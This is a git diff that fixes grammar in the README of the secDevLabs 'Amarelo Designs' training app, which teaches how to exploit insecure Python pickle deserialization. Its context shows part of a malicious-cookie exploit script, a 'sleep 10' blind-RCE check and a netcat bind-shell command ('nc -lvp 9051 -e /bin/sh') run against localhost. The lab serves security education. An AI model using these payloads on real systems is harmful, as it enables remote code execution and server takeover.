@@ -4,7 +4,7 @@
     <img src="images/Amarelo-Designs.png"/>
 </p>
 
-This is a simple web application built with Flask that contains an example of an Insecure Deserialization vulnerability and, it's main goal, is to describe how a malicious user could exploit a vulnerability, intentionally installed on Amarelo Designs from secDevLabs, to obtain a blind remote code execution.
+This is a simple web application built with Flask that contains an example of an Insecure Deserialization vulnerability and, its main goal is to describe how a malicious user could exploit a vulnerability, intentionally installed on Amarelo Designs from secDevLabs, to obtain blind remote code execution.
 
 ## Index
 
@@ -17,7 +17,7 @@ This is a simple web application built with Flask that contains an example of an
 
 ## What is Insecure Deserialization?
 
-Serialization is the process of translating data structures, or object state, into a format that can be stored or transmitted and reconstructed later. Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.
+Serialization is the process of translating data structures or object state, into a format that can be stored or transmitted and reconstructed later. Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.
 
 The main goal of this app is to discuss how **Insecure Deserialization** vulnerabilities can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.
 
@@ -44,7 +44,7 @@ To properly understand how this application works, you can follow these simple s
 
 ## Attack narrative
 
-Now that you know the purpose of this app, what could possibly go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or it's users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜
+Now that you know the purpose of this app, what could go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or its users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜
 
 ### 👀
 
@@ -89,7 +89,7 @@ The structure found is very similar to the ones created with the [Pickle] functi
 
 <img src="images/attack7.png" align="center"/>
 
-If an attacker knew that the app uses `Pickle` as the serialisation method, he/she could create a malicious cookie to take advantage of it and execute code remotely. An example of an exploit (serializaPickle.py) in Python 3 that could produce this cookie could be:
+If an attacker knew that the app uses `Pickle` as the serialization method, he/she could create a malicious cookie to take advantage of it and execute code remotely. An example of an exploit (serializaPickle.py) in Python 3 that could produce this cookie could be:
 
 ```python
 import pickle
@@ -122,7 +122,7 @@ print(cookie)
 r = requests.get(url, cookies=cookie)
 ```
 
-In order to be certain that the app is exploitable, we will send a sleep command to make the app unresposive for 10 seconds. If the app takes 10 seconds to return our request, than it's confirmed, the app is exploitable. As we can see from the image below, the app takes some time to return our request, thus confirming that it is exploitable and confirming the remote code execution:
+To be certain that the app is exploitable, we will send a sleep command to make the app unresponsive for 10 seconds. If the app takes 10 seconds to return our request, then it's confirmed, the app is exploitable. As we can see from the image below, the app takes some time to return our request, thus confirming that it is exploitable and confirming the remote code execution:
 
 ```sh
 $ python3 serializaPickle.py "sleep 10" http://localhost:5000/user
@@ -130,7 +130,7 @@ $ python3 serializaPickle.py "sleep 10" http://localhost:5000/user
 
 <img src="images/attack9.png" align="center"/>
 
-In order to show how an attacker could have access to the server through a RCE, we will use the code depicted on the image below to create a bind shell on the server's 9051 port.
+To show how an attacker could have access to the server through an RCE, we will use the code depicted on the image below to create a bind shell on the server's 9051 port.
 
 ```sh
 $ python3 serializaPickle.py "nc -lvp 9051 -e /bin/sh" http://localhost:5000/user
